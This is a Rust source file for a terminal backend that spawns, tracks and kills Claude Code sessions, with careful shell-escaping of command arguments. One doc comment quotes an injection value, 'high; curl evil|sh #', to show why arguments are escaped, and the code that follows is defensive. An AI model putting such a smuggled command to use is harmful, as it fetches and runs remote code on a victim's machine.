//! Native terminal backend
//!
//! Spawns sessions in native terminal windows (kitty, alacritty, etc.)
//! using xdg-terminal-exec or fallback detection.

mod detection;
mod launch;
mod pid_guard;
mod pid_tracking;
mod spawner;
mod window_ops;
mod wrapper;

use anyhow::Result;
use shell_escape::escape;
use std::borrow::Cow;
use std::path::{Path, PathBuf};

use crate::models::session::{Session, SessionType};
use crate::models::stage::Stage;
use crate::models::worktree::Worktree;
use crate::remote_control::RemoteControlInvocation;

pub use detection::detect_terminal;
pub(crate) use launch::prepare_session_launch;
pub(crate) use pid_guard::{
    pid_only_is_alive, pid_only_terminate, session_process_status, SessionProcessStatus,
};
pub use pid_tracking::{cleanup_stage_files, discover_claude_pid, read_pid_entry};
pub(crate) use spawner::await_session_pid;
pub use spawner::spawn_in_terminal;
pub use window_ops::{close_window_by_title, window_exists_by_title};
#[cfg(target_os = "macos")]
pub use window_ops::{close_window_by_title_for_terminal, window_exists_by_title_for_terminal};
pub use wrapper::create_wrapper_script;

fn close_window_for_terminal(title: &str, terminal: &super::emulator::TerminalEmulator) -> bool {
    #[cfg(target_os = "macos")]
    {
        close_window_by_title_for_terminal(title, terminal)
    }

    #[cfg(not(target_os = "macos"))]
    {
        let _ = terminal;
        close_window_by_title(title)
    }
}

fn window_exists_for_terminal(title: &str, terminal: &super::emulator::TerminalEmulator) -> bool {
    #[cfg(target_os = "macos")]
    {
        window_exists_by_title_for_terminal(title, terminal)
    }

    #[cfg(not(target_os = "macos"))]
    {
        let _ = terminal;
        window_exists_by_title(title)
    }
}

/// Build the `claude` invocation string shared by all native spawn sites.
///
/// Produces `"{claude_path} --model {model} --effort {effort} --permission-mode
/// {permission_mode} {escaped_prompt}[ --remote-control[=name]]"`.
///
/// `--permission-mode` is passed on the CLI rather than left to
/// `permissions.defaultMode` in the worktree's `settings.local.json`, because
/// Claude Code v2.1.142+ deliberately IGNORES `defaultMode: "auto"` from
/// project/local settings files (a repo must not be able to grant itself auto
/// mode). Only the `--permission-mode` startup flag (or user/managed settings)
/// is honored, so loom stages configured for `auto` would otherwise silently
/// fall back to `default` and prompt for every action — defeating autonomous
/// execution. The value is the camelCase spelling Claude Code's
/// `--permission-mode` flag accepts (`auto`, `acceptEdits`, `plan`, `default`).
///
/// The `--remote-control` flag is emitted per `remote_control`:
/// [`RemoteControlInvocation::Disabled`] omits it entirely (`claude
/// --remote-control` exits non-zero when its prerequisites are unmet, so it
/// must never be passed unconditionally), [`RemoteControlInvocation::Bare`]
/// passes the flag with no argument, and [`RemoteControlInvocation::Named`]
/// passes `--remote-control=<name>`. `Bare` exists because older claude
/// versions accept the flag but not its optional name argument; the two are
/// told apart by the `--help` probe in `remote_control.rs`
/// ([`crate::remote_control::resolve_invocation`] via
/// `cached_named_arg_supported`).
///
/// The `Named` value is joined with `=` rather than a space. `--remote-control
/// [name]` takes an *optional* argument: a space-separated value beginning
/// with `-` risks being reparsed as the NEXT option rather than consumed as
/// the name (`shell_escape` does not protect against this — a leading `-` is
/// not a shell metacharacter, so it is passed through unquoted). The `=` form
/// binds the value unambiguously regardless of its first character.
///
/// The flag MUST still come after the positional prompt: placed before it,
/// the arg parser can swallow the prompt as the RC session name (for `Bare`,
/// a following non-flag token is exactly what the optional-argument parser
/// would otherwise consume) and claude starts with no initial prompt (the
/// session sits idle / "stuck").
///
/// `claude_path`, `model`, `effort`, `permission_mode`, and the `Named`
/// session name are passed RAW and shell-escaped here. This is a
/// command-construction trust boundary: model strings containing shell
/// metacharacters would otherwise be glob-expanded by the shell, and a
/// tampered effort such as `high; curl evil|sh #` would be command injection.
/// The `Named` value carries the same exposure — it is derived from a stage
/// name that originates in plan YAML — so it is escaped alongside them (the
/// `=` join additionally closes the leading-`-` flag-reparsing risk noted
/// above, which shell-escaping alone does not).
/// `escaped_prompt` is pre-escaped by the caller (it is built from a trusted
/// signal path).
pub(crate) fn build_claude_command(
    claude_path: &str,
    model: &str,
    effort: &str,
    permission_mode: &str,
    remote_control: &RemoteControlInvocation,
    escaped_prompt: &str,
) -> String {
    let claude_path = escape(Cow::Borrowed(claude_path));
    let model = escape(Cow::Borrowed(model));
    let effort = escape(Cow::Borrowed(effort));
    let permission_mode = escape(Cow::Borrowed(permission_mode));
    let remote_control_flag = match remote_control {
        RemoteControlInvocation::Disabled => String::new(),
        RemoteControlInvocation::Bare => " --remote-control".to_string(),
        RemoteControlInvocation::Named(name) => {
            format!(" --remote-control={}", escape(Cow::Borrowed(name.as_str())))
        }
    };
    format!(
        "{claude_path} --model {model} --effort {effort} --permission-mode {permission_mode} {escaped_prompt}{remote_control_flag}"
    )
}

/// Native terminal backend - spawns sessions in native terminal windows
pub struct NativeBackend {
    /// The terminal emulator to use
    terminal: super::emulator::TerminalEmulator,
    /// The .work directory path for PID tracking
    work_dir: PathBuf,
}

impl NativeBackend {
    /// Create a new native backend, detecting the available terminal.
    ///
    /// Terminal detection runs subprocess probes, so this is not free: callers
    /// that may reach it repeatedly (see `SessionBackend::native_lane`) must
    /// memoize the result rather than reconstructing per call.
    pub fn new(work_dir: PathBuf) -> Result<Self> {
        let terminal = detect_terminal()?;
        // Detection is worth recording when diagnosing terminal selection, but
        // it is not operator-facing news. `tracing::debug!` (the level the rest
        // of this cluster uses — see `window_ops`) keeps it off stderr unless
        // it was asked for; `eprintln!` here printed a line on every
        // construction, which after a tmux fallback meant once per session per
        // monitor tick.
        tracing::debug!(terminal = %terminal.display_name(), "Detected terminal");
        Ok(Self { terminal, work_dir })
    }

    /// Build a backend around an already-chosen terminal, bypassing detection.
    ///
    /// Test-only: sibling modules need a deterministically AVAILABLE native
    /// lane to exercise the tmux-fallback decision, and a headless test runner
    /// (where [`Self::new`] bails in `detect_terminal`) would otherwise make
    /// that path untestable exactly where it matters most.
    #[cfg(test)]
    pub(crate) fn with_terminal(
        terminal: super::emulator::TerminalEmulator,
        work_dir: PathBuf,
    ) -> Self {
        Self { terminal, work_dir }
    }

    /// Get the detected terminal emulator
    pub fn terminal(&self) -> &super::emulator::TerminalEmulator {
        &self.terminal
    }

    /// Returns `(window_title, pid_file_key)` for a session.
    ///
    /// - `window_title` is the session's `tracking_key` (`loom-[<kind>-]<id>`),
    ///   matched EXACTLY against OS window titles (O-5).
    /// - `pid_file_key` is `tracking_key + session.id` — the per-session key the
    ///   spawn path used to name the PID file, so two consecutive sessions for
    ///   the same stage never collide (O-14).
    ///
    /// Falls back to the bare stage id for legacy sessions with no
    /// `tracking_key`.
    pub(crate) fn window_title_and_pid_key(session: &Session) -> Option<(String, String)> {
        let title = if !session.tracking_key.is_empty() {
            session.tracking_key.clone()
        } else {
            format!("loom-{}", session.stage_id.as_ref()?)
        };
        let pid_key = format!("{}-{}", title, session.id);
        Some((title, pid_key))
    }

    pub fn spawn_session(
        &self,
        stage: &Stage,
        worktree: &Worktree,
        session: Session,
        signal_path: &Path,
    ) -> Result<Session> {
        self.spawn(
            SessionType::Stage,
            stage,
            session,
            signal_path,
            &worktree.path,
            true,
        )
    }

    pub fn spawn_merge_session(
        &self,
        stage: &Stage,
        session: Session,
        signal_path: &Path,
        repo_root: &Path,
    ) -> Result<Session> {
        self.spawn(
            SessionType::Merge,
            stage,
            session,
            signal_path,
            repo_root,
            false,
        )
    }

    pub fn spawn_knowledge_session(
        &self,
        stage: &Stage,
        session: Session,
        signal_path: &Path,
        repo_root: &Path,
    ) -> Result<Session> {
        self.spawn(
            SessionType::Knowledge,
            stage,
            session,
            signal_path,
            repo_root,
            false,
        )
    }

    /// Unified spawn for every native session type.
    ///
    /// The per-kind variation (window title / PID-file key prefix, prompt,
    /// model/effort source, working directory) is derived from `kind` and the
    /// session's `tracking_key`, collapsing what used to be four ~85% identical
    /// methods (A-12 / D-3). The four public `spawn_*` methods are thin
    /// wrappers so out-of-cluster callers keep their signatures.
    ///
    /// * `kind` — selects the prompt and the model/effort policy.
    /// * `cwd` — the directory the wrapper `cd`s into and the terminal spawns
    ///   from (the worktree for stage sessions, the repo root otherwise).
    /// * `set_worktree_path` — only stage sessions record a worktree path; the
    ///   others run in the main repo.
    fn spawn(
        &self,
        kind: SessionType,
        stage: &Stage,
        session: Session,
        signal_path: &Path,
        cwd: &Path,
        set_worktree_path: bool,
    ) -> Result<Session> {
        let cwd_str = cwd.to_str().ok_or_else(|| {
            anyhow::anyhow!(
                "Session working directory contains invalid UTF-8: {}",
                cwd.display()
            )
        })?;

        // Everything up to "have a wrapper script ready to run" is shared
        // with the tmux lane (see native::launch) so the two can never
        // silently diverge on prompt/model/permission-mode/wrapper behavior.
        let (mut session, title, pid_key, wrapper_path_abs) =
            launch::prepare_session_launch(&self.work_dir, kind, stage, session, signal_path, cwd)?;
        // Spawn the terminal with PID tracking constrained by this session's
        // LOOM_SESSION_ID marker (O-14).
        let pid = spawn_in_terminal(
            &self.terminal,
            &title,
            Path::new(cwd_str),
            &wrapper_path_abs,
            Some(&self.work_dir),
            Some(&pid_key),
            Some(&session.id),
        )?;

        // Update the session with spawn info.
        if set_worktree_path {
            session.set_worktree_path(cwd.to_path_buf());
        }
        session.set_pid(pid);
        session.try_mark_running()?;

        Ok(session)
    }

    pub fn kill_session(&self, session: &Session) -> Result<()> {
        // First, try to close the window by title (more reliable for all terminals).
        // This approach works correctly even for terminal emulators like gnome-terminal
        // that use a server process, where killing by PID would kill all windows.
        // The title is the session's tracking_key, so merge/knowledge/base-conflict
        // sessions (which use prefixed titles) are killed correctly too.
        if let Some((title, pid_key)) = Self::window_title_and_pid_key(session) {
            if close_window_for_terminal(&title, &self.terminal) {
                // Clean up tracking files after closing the window
                cleanup_stage_files(&self.work_dir, &pid_key);
                return Ok(());
            }
        }

        // Window teardown is title-keyed and does not require process identity.
        // PID signaling remains fail-closed: an absent or unverifiable identity
        // must not turn an idempotent cleanup request into an error.
        match session_process_status(&self.work_dir, session) {
            SessionProcessStatus::VerifiedAlive => pid_only_terminate(&self.work_dir, session),
            // Keep dead identity evidence as a tombstone for liveness semantics;
            // `loom clean` reaps it once the corresponding session is terminal.
            SessionProcessStatus::Dead => Ok(()),
            SessionProcessStatus::Missing => {
                tracing::warn!(session_id = %session.id, "no PID identity evidence while killing session; window close was attempted");
                Ok(())
            }
            SessionProcessStatus::Unverifiable => {
                tracing::warn!(session_id = %session.id, "refusing unverified signal for session; window close was attempted");
                Ok(())
            }
        }
    }

    pub fn is_session_alive(&self, session: &Session) -> Result<bool> {
        match session_process_status(&self.work_dir, session) {
            SessionProcessStatus::VerifiedAlive => return Ok(true),
            // A live PID whose start time cannot be verified is safe to treat
            // as alive (avoids duplicate launches), but teardown still refuses
            // to signal it.
            SessionProcessStatus::Unverifiable => return Ok(true),
            // A vanished PID or start-time mismatch is definitive. Never let
            // a stale window title overturn that identity verdict.
            SessionProcessStatus::Dead => return Ok(false),
            SessionProcessStatus::Missing => {}
        }

        if let Some((title, _)) = Self::window_title_and_pid_key(session) {
            if window_exists_for_terminal(&title, &self.terminal) {
                return Ok(true);
            }
        }

        Ok(false)
    }
}

#[cfg(test)]
pub(crate) fn write_test_pid_identity(work_dir: &Path, session: &Session, pid: u32) -> Result<()> {
    let (_, pid_key) = NativeBackend::window_title_and_pid_key(session)
        .ok_or_else(|| anyhow::anyhow!("test session has no process tracking key"))?;
    let identity = crate::process::ProcessIdentity {
        pid,
        start_time: crate::process::process_start_time(pid),
    };
    pid_tracking::write_pid_entry(work_dir, &pid_key, identity)
}

#[cfg(test)]
mod tests;
